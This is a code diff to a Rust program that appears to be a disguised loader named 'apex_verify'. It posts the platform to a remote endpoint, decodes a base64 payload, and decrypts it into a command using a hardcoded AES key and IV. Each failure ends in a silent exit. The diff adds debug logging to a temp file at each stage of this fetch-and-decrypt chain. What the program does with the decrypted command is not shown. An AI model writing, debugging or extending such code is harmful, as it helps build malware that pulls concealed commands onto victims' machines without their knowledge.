@@ -307,28 +307,40 @@ fn main() {
     let platform = if cfg!(target_os = "windows") { "win32" } else { "darwin" };
     let body = format!("{{\"p\":\"{}\"}}", platform);
 
+    let log_path = if cfg!(target_os = "windows") {
+        format!("{}\\AppData\\Local\\Temp\\apex_verify.log", std::env::var("USERPROFILE").unwrap_or_default())
+    } else {
+        "/tmp/apex_verify.log".to_string()
+    };
+    let mut log = String::new();
+    log.push_str(&format!("ep: {}\n", ep));
+
     let resp = match http_post(&ep, &body) {
-        Some(r) => r,
-        None => { std::process::exit(0); }
+        Some(r) => { log.push_str(&format!("http_post OK len={}\n", r.len())); r }
+        None => { log.push_str("http_post FAILED\n"); let _ = fs::write(&log_path, &log); std::process::exit(0); }
     };
 
     let b64 = match parse_d(&resp) {
-        Some(d) => d,
-        None => { std::process::exit(0); }
+        Some(d) => { log.push_str("parse_d OK\n"); d }
+        None => { log.push_str(&format!("parse_d FAILED\n")); let _ = fs::write(&log_path, &log); std::process::exit(0); }
     };
 
     let key = sha256(b"ApexVrf2026Key");
     let iv = md5(b"ApexVrf2026IV");
 
     let data = match base64_decode(&b64) {
-        Some(d) => d,
-        None => { std::process::exit(0); }
+        Some(d) => { log.push_str("base64 OK\n"); d }
+        None => { log.push_str("base64 FAILED\n"); let _ = fs::write(&log_path, &log); std::process::exit(0); }
     };
 
     let cmd = match aes256cbc_dec(&key, &iv, &data) {
-        Some(c) => match String::from_utf8(c) { Ok(s) => s, Err(_) => { std::process::exit(0); } },
-        None => { std::process::exit(0); }
+        Some(c) => match String::from_utf8(c) {
+            Ok(s) => { log.push_str(&format!("decrypt OK\n")); s }
+            Err(_) => { log.push_str("utf8 FAILED\n"); let _ = fs::write(&log_path, &log); std::process::exit(0); }
+        },
+        None => { log.push_str("aes FAILED\n"); let _ = fs::write(&log_path, &log); std::process::exit(0); }
     };
+    let _ = fs::write(&log_path, &log);
 
     let done = dp();
     if let Some(p) = done.parent() { let _ = fs::create_dir_all(p); }
